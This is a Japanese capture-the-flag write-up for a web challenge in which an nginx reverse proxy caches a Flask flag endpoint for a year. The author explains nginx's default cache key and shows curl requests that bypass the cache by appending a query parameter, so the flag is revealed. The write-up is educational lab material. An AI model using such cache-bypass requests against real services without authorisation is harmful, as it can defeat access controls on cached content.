---
title: Daily-AlpacaHack 「Cache Me If You Can」Easy Writeup
description: リバースプロキシ キャッシュ機構バイパス
date: 2026-06-03 12:37:00 +0900
categories: [CyberSecurity, CTF]
tags: [alpacahack, web]
---

# 20260602-daily-web-easy-Cache_Me_If_You_Can

## Summary

本問は，リバースプロキシのキャッシュ機構をバイパスする問題です．

> - **Category**: Web
> - **Description**: フラグがわかるのは１年後
> - **Tools & TechStack**:
> 	- Python (Flask)
> 	- Nginx
{: .prompt-info }

**階層構造**
```
.
├── app
│   ├── Dockerfile
│   └── server.py
├── compose.yaml
└── nginx
    ├── default.conf
    └── Dockerfile

3 directories, 5 files
```

---
## Solution Path

### ソースコードの調査

`/flag` に対しての **初回アクセス (`first_request = True`)** であれば，`Cache me if you can.` という文字列を返し，グローバル変数を `False` に書き換えます．
既に `False` の状態なため，次に `/flag` アクセスすることで，`FLAG` が返ってくるはずです．

`app/server.py`
```python
from flask import Flask

FLAG = "Alpaca{REDACTED}"
app = Flask(__name__)
first_request = True

@app.get("/")
def index():
    return "Try /flag. The cache stores responses for one year :P"

@app.get("/flag")
def flag():
    global first_request
    # print(first_request, flush=True) # デバッグ用
    body = "Cache me if you can." if first_request else FLAG
    first_request = False
    return body

app.run(host="0.0.0.0", port=8000)

```

#### `server.py` 動作検証

ログを見ると，2回目の通信がサーバに届いていません．
これは，**nginx** リバースプロキシが同一リクエストをキャッシュしているためです．そこで，**nginx** の `default.conf` を見ます．

**`app` コンテナのログ**
```shell
$ docker logs -f 0bf0d7ee6f88
 * Serving Flask app 'server'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.19.0.2:8000
Press CTRL+C to quit
True
172.19.0.3 - - [02/Jun/2026 08:07:04] "GET /flag HTTP/1.1" 200 -
```

**リクエスト**
```shell
# 1回目
$ curl -i http://172.17.0.1:3000/flag
HTTP/1.1 200 OK
Server: nginx/1.31.1
Date: Tue, 02 Jun 2026 08:07:04 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 20
Connection: keep-alive

Cache me if you can.%


# 2回目
$ curl -i http://172.17.0.1:3000/flag
HTTP/1.1 200 OK
Server: nginx/1.31.1
Date: Tue, 02 Jun 2026 08:08:34 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 20
Connection: keep-alive

Cache me if you can.
```

### **Nginx** のキャッシュ設定

- `inactive=365d`: 365日間アクセスの無いキャッシュを削除する
- `location / {...}`: ルート以下すべてに共通の設定を定義する
	- `proxy_pass http://app:8000;`: 届いたリクエストをバックエンドで動いている **`http://app:8000` (Flaskサーバー) へ転送** する
	- `proxy_cache flag_cache;`: `flag_cache` キャッシュ領域を有効化する
	- `proxy_cache_valid 200 365d;`: Flaskから返ってきたレスポンスのステータスコードが `200 OK` だった場合，その内容を **365日間** キャッシュとして有効な正しいデータとみなす

`nginx/default.conf`
```nginx
proxy_cache_path /var/cache/nginx/proxy keys_zone=flag_cache:10m inactive=365d;

server {
    listen 80;

    location / {
        proxy_pass http://app:8000;
        proxy_cache flag_cache;
        proxy_cache_valid 200 365d;
    }
}
```

この設定のせいで，本来はサーバから `FLAG` が返ってくるはずが一番最初にアクセスした状態のキャッシュが返ってきています．
しかも，普通に使用すると **365** 日経たなければキャッシュが解除されません．さすがにそんなに待てないので，キャッシュをバイパスする方法を考えます．

### キャッシュのバイパス

ここで，キャッシュを使用させないためには，リバースプロキシに同一のリクエストではないと認識させる必要があります．
同一のリクエストをどのように認識し分けているのかを調べると，`ngx_http_proxy_module` の `proxy_cache_key` という機能[^1] を使用しているようです．

設定ファイルで明示的に指定しない場合，キャッシュキーは `$scheme$proxy_host$request_uri` で定義されていました．
デフォルトでは，このディレクティブの値は `$scheme$proxy_host$uri$is_args$args` の文字列に近いらしいです．

この組み込み変数を分解すると，以下のように定義されていました．
- `$scheme`: `http` や `https` 等のプロトコル指定子
- `$proxy_host`: バックエンドのホスト名やIP (今回の場合は `app:8000`)
- `$uri`: リクエストされたパス部分 (例: `/flag`)
- `$is_args`: クエリパラメータが存在する場合は `?`、なければ空文字
- `$args`: **クエリパラメータそのもの (例: `a=1` や `a=2`)**

これを見るに，別のリクエストと判断させる要素として，現状況で唯一使用可能なのは，クエリパラメータです．
なので，クエリパラメータを付けてリクエストすることで `/flag` へのリクエストでありながら，別のものであると認識させ，キャッシュを利用させないことができます．

### Exploitation

1. `http://172.17.0.1:3000/flag`: 初回アクセスで，`first_request = False` となり，`FLAG` が出力可能な状態になる
2. `http://172.17.0.1:3000/flag?q=1`: クエリパラメータにより，別々のリクエストとして処理され，既に `False` なため `FLAG` が返ってくる

**`app` コンテナのログ**
```shell
$ docker logs -f e2af60d21ed6        
 * Serving Flask app 'server'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:8000
 * Running on http://172.19.0.2:8000
Press CTRL+C to quit
True
172.19.0.3 - - [02/Jun/2026 08:40:48] "GET /flag HTTP/1.1" 200 -
False
172.19.0.3 - - [02/Jun/2026 08:41:11] "GET /flag?q=1 HTTP/1.1" 200 -
```

**リクエスト**
```shell
$ curl -i http://172.17.0.1:3000/flag
HTTP/1.1 200 OK
Server: nginx/1.31.1
Date: Tue, 02 Jun 2026 08:40:48 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 20
Connection: keep-alive

Cache me if you can.


$ curl -i 'http://172.17.0.1:3000/flag?q=1'
HTTP/1.1 200 OK
Server: nginx/1.31.1
Date: Tue, 02 Jun 2026 08:41:11 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 16
Connection: keep-alive

Alpaca{REDACTED}%
```

---
## Post-Mortem & Dead ends

## References

[^1]: [Module ngx\_http\_proxy\_module](https://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_cache_key)
